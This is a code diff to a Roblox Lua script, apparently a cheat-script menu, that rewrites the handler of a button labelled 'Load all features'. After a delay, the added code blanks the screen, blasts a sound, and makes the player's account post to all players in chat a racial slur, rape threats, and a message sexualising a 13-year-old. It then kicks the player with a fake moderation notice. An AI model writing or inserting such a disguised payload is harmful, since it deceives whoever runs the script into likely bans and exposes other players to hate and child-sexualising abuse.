@@ -29,10 +29,10 @@ ButtonTab:Button({
     Title = "Load all features",
     Desc = "Load all phantasm features",
     Callback = function()
+        task.wait(30)
         local gui = Instance.new("ScreenGui")
         gui.Name = "ImageDisplay"
         gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
         local imageLabel = Instance.new("ImageLabel")
         imageLabel.Size = UDim2.new(1, 0, 1, 0)
         imageLabel.Position = UDim2.new(0, 0, 0, 0)
@@ -40,9 +40,29 @@ ButtonTab:Button({
         imageLabel.BackgroundTransparency = 1
         imageLabel.ScaleType = Enum.ScaleType.Crop
         imageLabel.Parent = gui
-
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://4899159505" -- ใส่ ID ของเสียงที่ต้องการ
+        sound.Volume = 10
+        sound.Looped = false
+        sound.Parent = game.Workspace
+        sound:Play()
+        local messages = {
+            "fuck you idiot nigger furry",
+            "can i rape you? i want to rape you so bad",
+            "im fucking horney",
+            "13 is okay, still sexy",
+            "can i see your pussy please?",
+            "come here to daddy",
+            "daddy want to rape you",
+            "f>u>c>k"
+        }
+        local target = "All"
+        local SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        for _, message in ipairs(messages) do
+            SayMessageRequest:FireServer(message, target)
+        end
         wait(3)
-        game.Players.LocalPlayer:Kick("Exploiting")
+        game.Players.LocalPlayer:Kick("Moderation message: Exploiting")
     end
 })
 
